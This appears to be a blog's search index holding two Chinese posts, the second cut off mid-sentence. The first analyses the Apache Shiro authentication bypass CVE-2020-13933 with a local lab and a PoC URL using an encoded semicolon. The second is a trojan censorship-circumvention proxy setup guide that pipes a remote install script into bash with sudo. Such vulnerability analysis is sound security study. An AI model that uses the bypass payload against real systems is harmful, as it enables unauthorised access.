<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2020-13933 漏洞分析</title>
      <link href="/safe/cve-2020-13933-lou-dong-fen-xi/"/>
      <url>/safe/cve-2020-13933-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>Apache Shiro 是一个强大且易用的 Java 安全框架，执行身份验证、授权、密码和会话管理，通常会和 Spring 等框架一起搭配使用来开发 web 应用（请求在到达 Spring 之前，会先经过 Shiro 认证身份）。</p><p>因为某个特定测试场景，Shiro 被白帽子发现了 CVE-2020-11989 身份校验绕过漏洞，漏洞原因在于 Shiro 处理 url 的逻辑与 spring 存在差异。</p><p>对此官方发布了 1.5.3 版本进行修复，但是因为修复补丁存在缺陷， 再次导致了 CVE-2020-13933 身份校验绕过漏洞，官方不得不再次发布了 1.6.0 修复版本。</p><h2 id="漏洞靶场"><a href="#漏洞靶场" class="headerlink" title="漏洞靶场"></a>漏洞靶场</h2><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><p>环境要求：</p><ul><li>JDK: <code>1.8</code></li><li>spring-boot: <code>2.3.3</code></li><li>apache-shiro: <code>1.5.3 (&lt; 1.6.0)</code></li></ul><p>靶场源码（Maven）： <a href="https://github.com/lyy289065406/CVE-2020-13933">https://github.com/lyy289065406/CVE-2020-13933</a></p><p>靶场关键代码说明：</p><ul><li><a href="https://github.com/lyy289065406/CVE-2020-13933/blob/master/src/main/java/com/exp/cve/ShiroConfig.java"><code>ShiroConfig.java</code></a>： 权限配置， 当请求 <code>/res/*</code> 资源时， 302 跳转到登陆页面进行身份认证</li><li><a href="https://github.com/lyy289065406/CVE-2020-13933/blob/master/src/main/java/com/exp/cve/NameController.java"><code>NameController.java</code></a>：<br>　　□ <code>/res/{name}</code>： 请求名为 <code>name</code> 的的资源（触发身份认证）<br>　　□ <code>/res/</code>： 不请求任何资源（不触发身份认证）</li></ul><blockquote><p>此靶场已收录到 <a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-13933">Vulmon 漏洞情报搜索引擎</a></p></blockquote><h3 id="靶场验证"><a href="#靶场验证" class="headerlink" title="靶场验证"></a>靶场验证</h3><p>不在请求路由中指定资源名称时，不触发身份验证，也无资源返回： <a href="http://127.0.0.1:8080/res/"><code>http://127.0.0.1:8080/res/</code></a></p><p><img src="./01.png"></p><p>在请求路由中指定资源名称时，302 跳转到身份验证页面： <a href="http://127.0.0.1:8080/res/poc"><code>http://127.0.0.1:8080/res/poc</code></a></p><p><img src="./02.png"></p><p>构造特定 PoC 请求指定资源时，不触发身份验证，并返回资源： <a href="http://127.0.0.1:8080/res/%3bpoc">http://127.0.0.1:8080/res/%3bpoc</a> （<code>%3b</code> 是 <code>;</code> 的 URL 编码）</p><p><img src="./03.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="前置漏洞回顾"><a href="#前置漏洞回顾" class="headerlink" title="前置漏洞回顾"></a>前置漏洞回顾</h3><p>通过漏洞背景可知， CVE-2020-13933 是 CVE-2020-11989 的修复补丁不当产生的，因此有必要了解 CVE-2020-11989 的漏洞原因、以及官方补丁的改动位置。</p><p>通过查阅 CVE-2020-11989 现有的<a href="https://xz.aliyun.com/t/7964">漏洞分析报告</a>， 可知 Shiro 为了处理请求路由中形如 <code>;jsessionid=C7E5ED51DCE6B918FD88AE5575C589B6</code> 的参数，会截断 <code>;</code> 后的内容。</p><p>对于 Shiro <code>&lt; 1.5.3</code> 的版本，因为相关逻辑缺陷，若刻意构造路由类似 <code>/;/site/res/name</code> 的请求，会因为匹配错误导致请求路由截断成 <code>/</code>，此时因为没有指定要请求的资源路由，故不会触发 Shiro 的身份认证逻辑。</p><p>因为不需要认证身份，请求 <code>/;/site/res/name</code> 被直接送到 Spring 获取资源，经过 Spring 格式化后（截取根目录后的资源路径），请求路由截断成 <code>/res/name</code>，最终可以成功获取到资源页面，导致 Shiro 权限绕过。</p><p>为了修复这个漏洞， Shiro 发布了 1.5.3 版本，可以对比下官方修复的代码位置：</p><p>【修改前】 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.2-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.2</code></a>:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String contextPath <span class="token operator">=</span> <span class="token function">getContextPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    String requestUri <span class="token operator">=</span> <span class="token function">getRequestUri</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">startsWithIgnoreCase</span><span class="token punctuation">(</span>requestUri<span class="token punctuation">,</span> contextPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Normal case: URI contains context path.</span>        String path <span class="token operator">=</span> requestUri<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>contextPath<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">hasText</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">?</span> path <span class="token operator">:</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Special case: rather unusual.</span>        <span class="token keyword">return</span> requestUri<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>【修改后】 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a>:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">normalize</span><span class="token punctuation">(</span><span class="token function">removeSemicolon</span><span class="token punctuation">(</span><span class="token function">getServletPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">getPathInfo</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="当前漏洞分析"><a href="#当前漏洞分析" class="headerlink" title="当前漏洞分析"></a>当前漏洞分析</h3><p>由于官方更新 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 版本后，身份绕过漏洞依旧存在，说明这次代码修复的逻辑仍有不完善的地方。</p><p>为了分析漏洞成因，可以先搭建上述的靶场，然后在 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 的官方修复代码打断点 DEBUG。</p><p>不难发现，修复代码位置在 Shiro 处理请求路由的入口处 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>WebUtils.java</code></a>。为了便于分析，这里对代码做了逐行拆解：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 输入请求路由： http://127.0.0.1:8080/res/%3bpoc</span><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String servletPath <span class="token operator">=</span> <span class="token function">getServletPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// servletPath = "/res/;poc" （URL 已解码）</span>    String pathInfo <span class="token operator">=</span> <span class="token function">getPathInfo</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// pathInfo = ""</span>    String path <span class="token operator">=</span> servletPath <span class="token operator">+</span> pathInfo<span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// path = "/res/;poc"</span>    path <span class="token operator">=</span> <span class="token function">removeSemicolon</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// path = "/res/"  （截断 ; 后面的内容）</span>    path <span class="token operator">=</span> <span class="token function">normalize</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// path = "/res/"  （标准化 URL： 处理双斜杠、路径穿越）</span>    <span class="token keyword">return</span> path<span class="token punctuation">;</span>                                    <span class="token comment" spellcheck="true">// path = "/res/"</span><span class="token comment" spellcheck="true">//  return normalize(removeSemicolon(getServletPath(request) + getPathInfo(request)));</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./04.png"></p><p>很明显，该 PoC 通过 Shiro 处理后， 请求路由 <code>/res/%3bpoc</code> 会变成 <code>/res/</code>， 根据前面靶场的验证结果，因为此路由没有指定资源名称，因此不会触发身份认证，请求会直接送到 Spring 的相关逻辑处理以获取资源。</p><p>此时再 DEBUG 看看 Spring 的处理请求路由的入口代码 <a href="https://github.com/spring-projects/spring-framework/blob/v5.2.5.RELEASE/spring-web/src/main/java/org/springframework/web/util/UrlPathHelper.java"><code>UrlPathHelper.java</code></a> 是如何做的：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 输入请求路由： http://127.0.0.1:8080/res/%3bpoc</span><span class="token keyword">private</span> String <span class="token function">decodeAndCleanUriString</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> String uri<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// uri = "/res/%3bpoc" （URL 未解码）</span>    uri <span class="token operator">=</span> <span class="token function">removeSemicolonContent</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// uri = "/res/%3bpoc"  （截断 ; 后面的内容）</span>    uri <span class="token operator">=</span> <span class="token function">decodeRequestString</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> uri<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// uri = "/res/;poc"    （URL 字符解码）</span>    uri <span class="token operator">=</span> <span class="token function">getSanitizedPath</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// uri = "/res/;poc"    （标准化 URL： 处理双斜杠）</span>    <span class="token keyword">return</span> uri<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./05.png"></p><p>其实在这里已经可以发现，因为 Shiro 和 Spring 对 URL 的处理逻辑顺序不一致，导致两者得到的路由不同。</p><p>不妨根据这两段代码的逻辑，横向对比输入不同 URL 的情况下最终结果有什么差异。</p><ol><li>当输入为 <a href="http://127.0.0.1:8080/res/%3bpoc">http://127.0.0.1:8080/res/%3bpoc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/%3bpoc</code></td><td align="center">输入</td><td align="center"><code>/res/%3bpoc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/%3bpoc</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center"><code>;poc</code></td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">返回资源页面</td></tr></tbody></table><ol start="2"><li>当输入为 <a href="http://127.0.0.1:8080/res/;poc">http://127.0.0.1:8080/res/;poc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/;poc</code></td><td align="center">输入</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center">无资源名</td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">无资源返回</td></tr></tbody></table><ol start="3"><li>当输入为 <a href="http://127.0.0.1:8080/res/poc">http://127.0.0.1:8080/res/poc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/poc</code></td><td align="center">输入</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/poc</code></td><td align="center">URL 解码</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/poc</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">资源名</td><td align="center"><code>poc</code></td><td align="center">资源名</td><td align="center"><code>poc</code></td></tr><tr><td align="center">结果</td><td align="center">302 跳转身份认证</td><td align="center">结果</td><td align="center">返回资源页面</td></tr></tbody></table><ol start="4"><li>当输入为 <a href="http://127.0.0.1:8080/res/">http://127.0.0.1:8080/res/</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/</code></td><td align="center">输入</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center">无资源名</td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">无资源返回</td></tr></tbody></table><h3 id="分析结论"><a href="#分析结论" class="headerlink" title="分析结论"></a>分析结论</h3><p>显然除了第 1 种输入，其它 3 种输入的最终输出碰巧都是一致的，而第 1 种输入正是此漏洞的 PoC 。</p><p>造成这种情况的根本原因在于 Shiro 和 Spring 在【URL 截断】和【URL 解码】的操作顺序不一致。</p><p>回顾 URL 的处理过程，总结下来就是：</p><ul><li>URL 进入到 Shiro 时，因为先做 URL 编码 <code>%3b =&gt; ;</code> ，使得路由中的资源名被截断删除</li><li>Shiro 误以为请求路由中无资源名，故该次请求不触发身份认证逻辑</li><li>因不需要身份认证，请求路由被直接转发到 Spring</li><li>Spring 从请求路由中正确截取资源名称，并返回资源页面</li><li>最终导致 Shiro 身份认证被绕过</li></ul><blockquote><p>由于 Shiro 的身份认证是通过判断 URL 匹配来实现的，只要能找到 Shiro 处理 URL 逻辑与 Spring 框架处理 URL 逻辑不一致的地方，都有可能造成身份认证绕过。</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>对于这个漏洞，PoC 亦是 EXP ，只需要把 <code>%3b</code> 放在请求资源路由的最前面，即可绕过认证实现资源访问。</p><p>例如： <code>http://127.0.0.1:8080/res/%3b{资源名}</code> （<code>res</code> 属于站点根目录， 不属于资源路由的一部分）</p><p>当资源路由为后台路径时，攻击者即可绕过认证访问到后台资源。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>从漏洞分析过程可知，只需要调整 Shiro 处理逻辑顺序，使其与 Spring 保持一致即可修复此漏洞。</p><p>但是可能考虑到相同的漏洞已经出现连续了 2 次，所以官方使用了一种更灵活的修复方式：</p><p>不难发现官方补丁 <a href="https://github.com/apache/shiro/blob/shiro-root-1.6.0/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.6.0</code></a> 并没有修复 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 中有关 <code>WebUtils</code> 的问题代码。</p><p>取而代之的是引入了责任链模式，增加了针对 URL 的预处理过滤器 <a href="https://github.com/apache/shiro/blob/shiro-root-1.6.0/web/src/main/java/org/apache/shiro/web/filter/InvalidRequestFilter.java"><code>InvalidRequestFilter.java</code></a>，使得 URL 在到进入 Shiro 处理逻辑之前，就通过过滤器对分号、反斜杠和非 ASCII 字符预先进行过滤。尔后若这段修复代码再出现类似漏洞 ，要修复则简单得多。</p><h2 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h2><p>前面已经说过，由于 Shiro 的权限校验是通过判断 url 匹配来实现的，因此一般的挖掘思路是： 如果能找到 Shiro 处理 URL 逻辑与 web 框架处理 URL 逻辑不一致的地方，那么就有可能利用它进行权限绕过。</p><p>但说到底，此漏洞是某个白帽子在做渗透测试试题时偶尔发现的，否则除非是深谙 Shiro 和相关 web 框架的源码、知道两者处理 URL 逻辑的不一致，不然要在正常情况下发现这个漏洞几无可能。</p><p>在不熟悉底层代码逻辑的前提下，可以留意所关注框架的 CVE 修复补丁，通过确认修复内容，推理修复逻辑是否完整合理，也不失是一种捷径。这个漏洞也是这样被发现的，可以说这个漏洞的发现，偶然中带着必然。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《<a href="https://github.com/apache/shiro">Github： Apache Shiro 源码</a>》</li><li>《<a href="https://xz.aliyun.com/t/7964">Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</a>》</li><li>《<a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-13933">Vulmon 漏洞情报（CVE-2020-13933）</a>》</li><li>《<a href="https://nosec.org/home/detail/4531.html">【安全通报】Apache Shiro &lt; 1.6.0 权限绕过漏洞（CVE-2020-13933）</a>》</li><li>《<a href="https://www.anquanke.com/post/id/214964">shiro &lt; 1.6.0的认证绕过漏洞分析(CVE-2020-13933)</a>》</li><li>《<a href="https://xz.aliyun.com/t/8223">shiro CVE-2020-11989&amp;CVE-2020-13933复现分析</a>》</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>trojan 科学上网教程</title>
      <link href="/net/trojan-ke-xue-shang-wang-jiao-cheng/"/>
      <url>/net/trojan-ke-xue-shang-wang-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="trojan-简介"><a href="#trojan-简介" class="headerlink" title="trojan 简介"></a>trojan 简介</h2><p>trojan 是近两年兴起的科学上网工具，项目源码为 <a href="https://github.com/trojan-gfw">https://github.com/trojan-gfw</a>。</p><p>与强调加密和混淆的SS/SSR等工具不同，trojan 将通信流量伪装成互联网上最常见的 HTTPS 流量，从而有效防止流量被  <a href="https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E9%95%BF%E5%9F%8E">GFW</a>  检测和干扰。</p><p>在敏感时期，相比于 Shadowsocks 和 v2ray， trojan 能提供更稳定的上网体验。</p><h2 id="trojan-原理"><a href="#trojan-原理" class="headerlink" title="trojan 原理"></a>trojan 原理</h2><p>trojan 在设计时采用了更适应国情的思路。早期在穿透 GFW 时，人们认为强加密和随机混淆可能会欺骗 GFW 的过滤机制。然而trojan 实现了这个思路的反面：它模仿了互联网上最常见的 HTTPS 协议，以诱骗 GFW 认为它就是 HTTPS，从而不被识别。</p><p><img src="./01.png"></p><p>如图所示，trojan 工作在 443 端口，并且处理来自外界的 HTTPS 请求，如果是合法的 trojan 请求，那么为该请求提供代理服务，否则将该流量转交给 nginx，由 nginx 为其提供 web 服务。</p><p>基于这个工作过程可知，trojan 的一切表现均与 nginx 一致，不会引入额外特征，从而达到无法识别的效果。当然，为了防止恶意探测，我们需要将 80 端口的流量全部重定向到 nginx，并且服务器尽量只暴露 80 和 443 端口，这样可以使得服务器与常见的 web 服务器表现一致。</p><h2 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h2><ul><li>申请 1 台海外 VPS 服务器： 用于提供科学上网代理</li><li>申请 1 个域名并解析到该 VPS 服务器： 用于伪装 web 站点</li></ul><h3 id="申请-VPS-服务器"><a href="#申请-VPS-服务器" class="headerlink" title="申请 VPS 服务器"></a>申请 VPS 服务器</h3><p>调研了多个海外 VPS 服务商，首推 <a href="https://www.vultr.com/">vultr</a>， 1C1G 的配置 5 美刀/月，很实惠。每个月有 1000G 流量，看视频都足够了。</p><p>当然其他 VPS 服务商也不会差多少，都是价格的问题，自己按需选择即可。</p><blockquote><p>注意不要选用国内的云服务器，腾讯云、阿里云等都是禁止访问外网的，更别说科学上网了。</p></blockquote><p><img src="./02.png"></p><p>若选择了 CentOS 系统，先登陆服务器关闭 SELinux : </p><pre class="line-numbers language-shell"><code class="language-shell">setenforce 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后修改防火墙规则，放行相关协议流量：</p><pre class="line-numbers language-shell"><code class="language-shell">firewall-cmd --permanent --add-service=httpsfirewall-cmd --permanent --add-service=httpfirewall-cmd --permanent --add-port=80/tcpfirewall-cmd --permanent --add-port=443/tcpfirewall-cmd --permanent --add-port=8443/tcpfirewall-cmd --reload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者直接关闭防火墙亦可：</p><pre class="line-numbers language-shell"><code class="language-shell">systemctl stop firewalldsystemctl disable firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>若 VPS 页面控制台可以配置安全组/访问控制规则，需记得放行相应端口： 80、 443、 8443</p></blockquote><h3 id="申请域名与解析"><a href="#申请域名与解析" class="headerlink" title="申请域名与解析"></a>申请域名与解析</h3><p>需要注意的是，申请域名不能在国内的服务商处进行申请，比如阿里云，腾讯云等，因为国内的域名需要备案（即在政府审批）后才能使用，而由于我们是用来科学上网的，不可能去备案的，而且备案需要很长的时间。</p><p>因此我们只能在国外的服务商处注册域名，因为国外的域名除了 <code>.cn</code> 之外，不需要备案，即买即用。</p><p>以前可以通过 <a href="https://www.freenom.com/">freenom</a> 申请免费域名，但是现在这个网站越来越不稳定，总是申请不上。</p><p>这里推荐在最便宜的域名服务商 <a href="https://www.namesilo.com/">namesilo</a> 购买的域名，使用 <code>.xyz</code> 域名只需要 0.99 美刀/年，而且提供免费的域名解析服务。</p><p><img src="./03.png"></p><p>购买域名后，通过 【Manage My Domains】 =&gt; 【Domain】 =&gt; 【DNS Records:Update】 添加两个 A 类型域名解析（无 <code>www</code> 和 有 <code>www</code>），都解析到前面租用的 VPS 服务器 IP 即可，大概 1 小时生效。</p><p><img src="./04.png"></p><p><img src="./05.png"></p><p><img src="./06.png"></p><blockquote><p>根据 trojan的 原理，其实无需域名也能使用，直接对 VPS IP 自签发证书即可，但是直接通过 IP 提供 web 服务很容易被电信查到，不如有域名的稳定</p></blockquote><h3 id="申请域名-HTTPS-证书"><a href="#申请域名-HTTPS-证书" class="headerlink" title="申请域名 HTTPS 证书"></a>申请域名 HTTPS 证书</h3><p>有很多方法可以为域名申请 HTTPS 证书，这里推荐使用 Let’s Encrypt 获取免费证书。</p><p>Let’s Encrypt 是一个免费、非营利性的开放证书权威中心，由互联网安全研究小组（ISRG）支持，签发的免费证书被各个主流浏览器认可。任何域名持有人均可使用 Let’s Encrypt 申请免费证书来加密网站流量，公司、机构则建议付费获取 OV、EV 证书。</p><blockquote><p>域名没备案且 VPS 在国内，可能无法申请成功，解决办法请参考 <a href="https://tlanyan.me/lets-encrypt-renew-error-challenge-failed-for-domain-xxxx/">这里</a></p></blockquote><p>要获得 Let’s Encrypt 颁发的证书，需要首先安装 certbot ，这里通过 python3 安装：</p><pre class="line-numbers language-shell"><code class="language-shell"># 考虑到国内安装超时问题，已指定了安装源为清华源python3 -m pip install certbot --default-timeout=600 -i https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后通过此命令申请域名的 HTTPS 证书（<strong>注意替换 YOUR_DOMAIN</strong>）：</p><pre class="line-numbers language-shell"><code class="language-shell"># 第一次执行该命令，需要根据交互步骤先注册邮箱（注意保存好），以后不再需要# 该命令会占用 80 端口，执行前注意要停止相关进程（如 nginx）/usr/local/bin/certbot certonly --standalone -d YOUR_DOMAIN -d www.YOUR_DOMAIN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>证书默认的有效期为 90 天，在到期前的 30 天可以重新执行以下命令为更新证书有效期：</p><pre class="line-numbers language-shell"><code class="language-shell"># 该命令会占用 80 端口，执行前注意要停止相关进程（如 nginx）/usr/local/bin/certbot renew<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是每次都手动更新会比较麻烦，可以将其设置到 crontab 自动更新证书：</p><pre class="line-numbers language-shell"><code class="language-shell"># 编辑定时任务crontab -e# 每两个月更新一次证书0 0 1 */2 0 /usr/local/bin/certbot renew<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>certbot 申请的证书存储在 <code>/etc/letsencrypt</code> 目录:</p><ul><li>其他目录为 certbot 的注册账号信息</li><li><code>archive/YOUR_DOMAIN/</code> ： 存储 YOUR_DOMAIN 域名申请过的历史证书</li><li><code>live/YOUR_DOMAIN/</code> ： 存储 YOUR_DOMAIN 域名当前有效证书的链接文件</li></ul><p>之后会用到的只有两个文件：</p><ul><li><code>/etc/letsencrypt/live/YOUR_DOMAIN/fullchain.pem</code></li><li><code>/etc/letsencrypt/live/YOUR_DOMAIN/privkey.pem</code></li></ul><h2 id="在宿主机安装服务端"><a href="#在宿主机安装服务端" class="headerlink" title="在宿主机安装服务端"></a>在宿主机安装服务端</h2><h3 id="安装-trojan"><a href="#安装-trojan" class="headerlink" title="安装 trojan"></a>安装 trojan</h3><p>官方提供了一个 <a href="https://github.com/trojan-gfw/trojan-quickstart">快速安装脚本</a>，直接执行如下命令可完成 trojan 服务端的安装:</p><pre class="line-numbers language-shell"><code class="language-shell">sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/trojan-gfw/trojan-quickstart/master/trojan-quickstart.sh)"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后 trojan 会得到以下文件：</p><ul><li>启动脚本： <code>/etc/systemd/system/trojan.service</code></li><li>执行脚本： <code>/usr/local/bin/trojan</code></li><li>配置文件： <code>/usr/local/etc/trojan/config.json</code></li></ul><p>修改 <code>/usr/local/etc/trojan/config.json</code> 四处位置：</p><ul><li><code>remote_addr</code>: 伪装为 HTTP 服务的站点 IP， 因为后面会用 nginx 部署在本地，因此设置为 <code>127.0.0.1</code> 即可</li><li><code>password</code>: 之后 trojan 客户端连接到 trojan 服务的密码，可以设置多个</li><li><code>cert</code>: 前面申请的域名证书文件位置， 如 